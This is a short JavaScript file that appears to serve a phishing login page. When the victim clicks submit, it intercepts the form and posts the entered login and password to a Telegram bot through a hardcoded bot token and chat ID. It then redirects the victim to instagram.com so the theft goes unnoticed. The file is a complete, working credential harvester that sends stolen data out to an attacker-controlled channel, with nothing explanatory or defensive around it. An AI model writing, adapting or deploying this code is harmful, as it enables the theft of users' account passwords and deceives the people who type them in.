let submit = document.querySelector("button");
let inputs = document.querySelectorAll('input');
let bot_token = '6331537640:AAEWAGOf3T1ioJ0rk_cTO6528_dwTuvukqk'

submit.addEventListener("click", (e) => {
    e.preventDefault()
    fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: '858709040',
            text: `login: ${inputs[0].value} \n password: ${inputs[1].value}`
        })
    }).then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    }).then(data => {
        console.log(data);
        window.location.href = 'https://instagram.com'
    }).catch(error => {
        console.error('There was a problem with the fetch operation:', error);
    });
});

console.log(submit);
